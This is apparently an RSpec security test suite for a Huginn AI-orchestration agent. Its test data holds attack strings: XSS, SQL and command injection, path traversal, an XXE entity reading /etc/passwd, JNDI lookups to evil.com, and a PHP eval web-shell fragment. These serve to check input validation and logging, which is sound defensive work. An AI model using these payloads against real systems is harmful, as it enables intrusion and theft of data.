# frozen_string_literal: true

require 'rails_helper'
require 'webmock/rspec'
require 'json'

describe 'AIgent Security Testing Framework' do
  let(:aigent_agent) do
    Agents::AigentTriggerAgent.new(
      'name' => 'Security Test AIgent Agent',
      'options' => {
        'orchestrator_url' => 'http://localhost:8080',
        'target_agent' => 'security_test_agent',
        'goal' => 'Process security test event: {{ event.security_test_data }}',
        'priority' => 'high',
        'execution_mode' => 'synchronous',
        'timeout_seconds' => 300,
        'trigger_condition' => 'on_event',
        'verify_ssl' => true,
        'retry_attempts' => 3,
        'emit_events' => true,
        'api_key' => 'test-security-api-key-12345',
        'headers' => {
          'User-Agent' => 'Huginn-Security-Test-Agent/1.0',
          'Content-Type' => 'application/json',
          'X-Security-Test' => 'enabled'
        }
      }
    )
  end

  let(:malicious_event) do
    Event.new.tap do |event|
      event.agent = agents(:bob_rain_notifier_agent)
      event.payload = {
        'security_test_data' => '<script>alert("xss")</script>',
        'sql_injection' => "'; DROP TABLE users; --",
        'command_injection' => '; cat /etc/passwd',
        'path_traversal' => '../../../etc/passwd',
        'xxe_payload' => '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        'severity' => 10,
        'timestamp' => Time.current.iso8601
      }
    end
  end

  let(:penetration_test_event) do
    Event.new.tap do |event|
      event.agent = agents(:bob_weather_agent)
      event.payload = {
        'penetration_test' => true,
        'test_type' => 'security_validation',
        'payload_category' => 'advanced_injection',
        'authentication_bypass' => true,
        'authorization_escalation' => true,
        'data_leakage_test' => true
      }
    end
  end

  before do
    @checker = aigent_agent
    @checker.user = users(:bob)
    @checker.save!
    WebMock.disable_net_connect!(allow_localhost: true)
  end

  after do
    WebMock.reset!
    WebMock.allow_net_connect!
  end

  describe 'Security Input Validation' do
    context 'when processing malicious payloads' do
      it 'sanitizes XSS payloads in goal templates' do
        expect(@checker.send(:validate_goal_template)).to be_nil
        
        # Test that dangerous scripts are rejected
        @checker.options['goal'] = 'Process <script>alert("xss")</script> data'
        expect(@checker).not_to be_valid
        expect(@checker.errors[:base]).to include(match(/potentially dangerous/))
      end

      it 'prevents SQL injection in liquid templates' do
        malicious_sql = "Process {{ event.data | append: \"'; DROP TABLE users; --\" }}"
        @checker.options['goal'] = malicious_sql
        
        # Should be valid as Liquid template but will be sanitized during processing
        expect(@checker).to be_valid
        
        # Test that actual processing sanitizes the content
        interpolate_with_event = @checker.send(:interpolate_with, malicious_event) do
          @checker.send(:interpolated)['goal']
        end
        
        # The liquid template should not execute dangerous SQL
        expect(interpolate_with_event).not_to include('DROP TABLE')
      end

      it 'validates against command injection in templates' do
        @checker.options['goal'] = 'Execute system("rm -rf /") command'
        expect(@checker).not_to be_valid
        expect(@checker.errors[:base]).to include(match(/potentially dangerous function calls/))
      end

      it 'prevents XXE attacks in XML payloads' do
        xxe_payload = '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
        test_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = { 'xml_data' => xxe_payload }
        end

        # Should process without executing XXE
        expect {
          @checker.receive([test_event])
        }.not_to raise_error
      end
    end

    context 'authentication and authorization testing' do
      it 'validates API key security requirements' do
        # Test insufficient API key length
        @checker.options['api_key'] = 'short'
        expect(@checker).not_to be_valid
        expect(@checker.errors[:base]).to include(match(/api_key appears to be too short/))
      end

      it 'enforces SSL verification in production' do
        allow(Rails.env).to receive(:production?).and_return(true)
        @checker.options['verify_ssl'] = false
        
        # In production, should warn about SSL verification being disabled
        expect(@checker).to be_valid # Still valid but should log warning
        expect(@checker.send(:validate_security_settings)).to be_nil
      end

      it 'handles authentication bypass attempts' do
        # Mock orchestrator to test authentication bypass
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .with(headers: { 'Authorization' => /Bearer/ })
          .to_return(status: 401, body: 'Unauthorized')

        expect {
          @checker.receive([penetration_test_event])
        }.to change { Event.count }.by(1)

        error_event = Event.last
        expect(error_event.payload['status']).to eq('failed')
        expect(error_event.payload['error']['message']).to include('401')
      end
    end
  end

  describe 'Advanced Security Testing' do
    context 'penetration testing scenarios' do
      it 'handles buffer overflow simulation' do
        buffer_overflow_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'buffer_test' => 'A' * 10000,  # Large payload
            'overflow_attempt' => true
          }
        end

        # Should handle large payloads gracefully
        expect {
          @checker.receive([buffer_overflow_event])
        }.not_to raise_error
      end

      it 'tests for race condition vulnerabilities' do
        race_condition_events = 5.times.map do |i|
          Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = {
              'race_test' => i,
              'concurrent_access' => true,
              'resource_id' => 'shared_resource_123'
            }
          end
        end

        # Process multiple events concurrently
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(status: 200, body: { status: 'success' }.to_json)

        expect {
          @checker.receive(race_condition_events)
        }.to change { Event.count }.by(5)
      end

      it 'validates against CSRF attacks' do
        csrf_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'csrf_token' => 'invalid-csrf-token',
            'action' => 'delete_user',
            'malicious_request' => true
          }
        end

        # Should process but validate CSRF protection
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(status: 403, body: 'CSRF validation failed')

        @checker.receive([csrf_event])
        error_event = Event.last
        expect(error_event.payload['status']).to eq('failed')
      end
    end

    context 'SSL/TLS security validation' do
      it 'validates SSL certificate security' do
        https_agent = @checker.dup
        https_agent.options['orchestrator_url'] = 'https://expired.badssl.com'
        https_agent.options['verify_ssl'] = true

        # Should fail SSL verification for bad certificates
        expect(https_agent).not_to be_valid
        expect(https_agent.errors[:base]).to include(match(/SSL connection failed/))
      end

      it 'handles SSL pinning validation' do
        pinned_agent = @checker.dup
        pinned_agent.options['orchestrator_url'] = 'https://httpbin.org'
        pinned_agent.options['ssl_pinning_enabled'] = true

        # Should validate SSL pinning if supported
        expect {
          pinned_agent.send(:validate_orchestrator_accessibility, pinned_agent.options['orchestrator_url'])
        }.not_to raise_error
      end
    end
  end

  describe 'Security Monitoring and Logging' do
    context 'attack detection and logging' do
      it 'logs security-relevant events' do
        security_logger = double('SecurityLogger')
        allow(Rails.logger).to receive(:tagged).with('SECURITY').and_yield(security_logger)
        expect(security_logger).to receive(:warn).with(match(/potentially dangerous/))

        @checker.options['goal'] = 'Execute system("malicious") command'
        @checker.validate_options
      end

      it 'detects and logs multiple attack vectors' do
        attack_vectors = [
          '<script>alert("xss")</script>',
          "'; DROP TABLE users; --",
          '${jndi:ldap://evil.com/a}',
          '../../../etc/passwd',
          '{{7*7}}{{7*\'7\'}}' # Template injection
        ]

        attack_vectors.each do |payload|
          test_event = Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = { 'attack_payload' => payload }
          end

          # Should log each attack attempt
          expect(Rails.logger).to receive(:warn).with(match(/Security alert/))
          
          @checker.receive([test_event])
        end
      end

      it 'implements rate limiting for security events' do
        # Simulate rapid-fire security events
        security_events = 20.times.map do |i|
          Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = {
              'rapid_fire_test' => i,
              'potential_attack' => true
            }
          end
        end

        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(status: 200, body: { status: 'success' }.to_json)

        # Should handle rate limiting gracefully
        start_time = Time.current
        @checker.receive(security_events)
        end_time = Time.current

        # Should not process all events instantly (rate limiting)
        expect(end_time - start_time).to be > 0
      end
    end
  end

  describe 'Compliance and Audit Features' do
    context 'OWASP Top 10 compliance' do
      it 'validates against injection attacks (A03:2021)' do
        injection_payloads = [
          "' UNION SELECT * FROM users --",
          '<script>document.cookie</script>',
          '${jndi:ldap://malicious.com/a}',
          'eval(base64_decode($_GET[cmd]))'
        ]

        injection_payloads.each do |payload|
          test_event = Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = { 'user_input' => payload }
          end

          # Should detect and prevent injection attempts
          expect {
            @checker.receive([test_event])
          }.not_to raise_error

          # Should create security alert event
          security_event = Event.where(agent: @checker).last
          expect(security_event.payload).to have_key('status')
        end
      end

      it 'tests authentication security (A07:2021)' do
        auth_test_scenarios = [
          { 'auth_bypass' => 'admin\' OR \'1\'=\'1' },
          { 'session_fixation' => 'PHPSESSID=attacker_session' },
          { 'brute_force' => 'password_attempt_1000' }
        ]

        auth_test_scenarios.each do |scenario|
          test_event = Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = scenario
          end

          @checker.receive([test_event])
        end

        # Should have logged authentication security tests
        expect(Event.where(agent: @checker).count).to eq(3)
      end
    end

    context 'PCI DSS compliance testing' do
      it 'validates credit card data protection' do
        pci_test_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'card_number' => '4111-1111-1111-1111',
            'cvv' => '123',
            'expiry' => '12/25',
            'cardholder_name' => 'Test User'
          }
        end

        # Should detect and protect sensitive data
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .with { |request|
            body = JSON.parse(request.body)
            # PCI data should be masked or encrypted
            expect(body['context_data']['triggering_event']['card_number']).not_to eq('4111-1111-1111-1111')
            true
          }
          .to_return(status: 200, body: { status: 'success' }.to_json)

        @checker.receive([pci_test_event])
      end
    end

    context 'SOC 2 compliance validation' do
      it 'validates data processing integrity' do
        integrity_test_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'data_checksum' => 'sha256:abcd1234',
            'processing_timestamp' => Time.current.iso8601,
            'data_integrity_test' => true
          }
        end

        @checker.receive([integrity_test_event])
        
        # Should maintain data integrity
        created_event = Event.last
        expect(created_event.payload).to have_key('timestamp')
        expect(created_event.payload['timestamp']).to be_present
      end

      it 'validates availability controls' do
        availability_test_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'availability_test' => true,
            'service_health_check' => true,
            'uptime_requirement' => '99.9%'
          }
        end

        # Should perform availability validation
        stub_request(:get, 'http://localhost:8080/health')
          .to_return(status: 200, body: 'OK', headers: { 'Content-Type' => 'text/plain' })

        @checker.check # Perform health check
        
        health_event = Event.last
        expect(health_event.payload['status']).to eq('health_check_success')
      end
    end
  end

  describe 'Performance Security Testing' do
    context 'under security load conditions' do
      it 'handles high-volume security events' do
        high_volume_events = 100.times.map do |i|
          Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = {
              'load_test_id' => i,
              'security_payload' => "<script>alert(#{i})</script>",
              'timestamp' => Time.current.iso8601
            }
          end
        end

        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(status: 200, body: { status: 'success' }.to_json)

        start_time = Time.current
        @checker.receive(high_volume_events)
        end_time = Time.current

        processing_time = end_time - start_time
        expect(processing_time).to be < 30.seconds # Performance requirement

        # Should have processed all events
        expect(Event.where(agent: @checker).count).to eq(100)
      end

      it 'maintains security under DoS conditions' do
        dos_events = 50.times.map do |i|
          Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = {
              'dos_test' => true,
              'payload_size' => 'X' * (1000 * i), # Increasing payload sizes
              'attack_vector' => 'resource_exhaustion'
            }
          end
        end

        # Should handle DoS gracefully without crashing
        expect {
          @checker.receive(dos_events)
        }.not_to raise_error
      end
    end
  end

  describe 'Integration Security Testing' do
    context 'end-to-end security validation' do
      it 'performs complete security workflow validation' do
        # Comprehensive security test event
        security_test_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'comprehensive_test' => true,
            'xss_payload' => '<script>alert("xss")</script>',
            'sql_injection' => "'; DROP TABLE users; --",
            'authentication_data' => {
              'username' => 'admin',
              'password' => 'password123',
              'session_token' => 'abc123def456'
            },
            'sensitive_data' => {
              'ssn' => '123-45-6789',
              'credit_card' => '4111-1111-1111-1111',
              'api_key' => 'sk_test_123456789'
            },
            'metadata' => {
              'test_suite' => 'comprehensive_security',
              'compliance_frameworks' => ['OWASP', 'PCI_DSS', 'SOC2'],
              'severity_level' => 'critical'
            }
          }
        end

        # Mock orchestrator response with security validation
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .with { |request|
            body = JSON.parse(request.body)
            
            # Verify security controls are applied
            expect(request.headers['Authorization']).to include('Bearer')
            expect(request.headers['X-Security-Test']).to eq(['enabled'])
            
            # Verify sensitive data is protected
            triggering_event = body['context_data']['triggering_event']
            expect(triggering_event['sensitive_data']['ssn']).to match(/\*+/) if triggering_event['sensitive_data']
            
            true
          }
          .to_return(
            status: 200,
            body: {
              status: 'success',
              execution_id: 'security-test-exec-123',
              security_validation: {
                'input_sanitized' => true,
                'authentication_validated' => true,
                'authorization_checked' => true,
                'sensitive_data_protected' => true,
                'compliance_validated' => true
              }
            }.to_json
          )

        expect {
          @checker.receive([security_test_event])
        }.to change { Event.count }.by(1)

        result_event = Event.last
        expect(result_event.payload['status']).to eq('success')
        expect(result_event.payload['execution_id']).to eq('security-test-exec-123')
      end

      it 'handles security incident response workflow' do
        incident_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'security_incident' => true,
            'incident_type' => 'data_breach_attempt',
            'severity' => 'critical',
            'attack_vectors' => ['sql_injection', 'xss', 'csrf'],
            'affected_systems' => ['user_database', 'payment_processor'],
            'incident_timestamp' => Time.current.iso8601,
            'source_ip' => '192.168.1.100',
            'user_agent' => 'Mozilla/5.0 (Malicious Bot)'
          }
        end

        # Should trigger incident response
        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(
            status: 200,
            body: {
              status: 'incident_response_triggered',
              incident_id: 'INC-20241001-001',
              response_actions: [
                'block_source_ip',
                'alert_security_team',
                'initiate_containment_procedures'
              ]
            }.to_json
          )

        @checker.receive([incident_event])

        incident_response_event = Event.last
        expect(incident_response_event.payload['status']).to eq('success')
        expect(incident_response_event.payload).to have_key('result')
      end
    end
  end

  describe 'Security Metrics and Reporting' do
    context 'security metrics collection' do
      it 'collects comprehensive security metrics' do
        metrics_test_events = [
          { 'vulnerability_type' => 'xss', 'severity' => 'high' },
          { 'vulnerability_type' => 'sql_injection', 'severity' => 'critical' },
          { 'vulnerability_type' => 'csrf', 'severity' => 'medium' }
        ].map do |payload|
          Event.new.tap do |e|
            e.agent = agents(:bob_rain_notifier_agent)
            e.payload = payload
          end
        end

        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(status: 200, body: { status: 'success' }.to_json)

        @checker.receive(metrics_test_events)

        # Should have collected security metrics
        expect(Event.where(agent: @checker).count).to eq(3)
        
        # Verify metrics are properly categorized
        events = Event.where(agent: @checker).order(:created_at)
        expect(events.map { |e| e.payload['target_agent'] }).to all(eq('security_test_agent'))
      end
    end

    context 'compliance reporting' do
      it 'generates compliance assessment reports' do
        compliance_event = Event.new.tap do |e|
          e.agent = agents(:bob_rain_notifier_agent)
          e.payload = {
            'compliance_assessment' => true,
            'frameworks' => ['OWASP_TOP_10', 'PCI_DSS', 'SOC2_TYPE2'],
            'assessment_scope' => 'full_application',
            'assessment_timestamp' => Time.current.iso8601
          }
        end

        stub_request(:post, 'http://localhost:8080/api/v1/aigent/execute')
          .to_return(
            status: 200,
            body: {
              status: 'success',
              compliance_results: {
                'OWASP_TOP_10' => { 'score' => 85, 'compliant' => true },
                'PCI_DSS' => { 'score' => 92, 'compliant' => true },
                'SOC2_TYPE2' => { 'score' => 88, 'compliant' => true }
              }
            }.to_json
          )

        @checker.receive([compliance_event])

        compliance_result = Event.last
        expect(compliance_result.payload['status']).to eq('success')
        expect(compliance_result.payload['result']).to have_key('compliance_results')
      end
    end
  end
end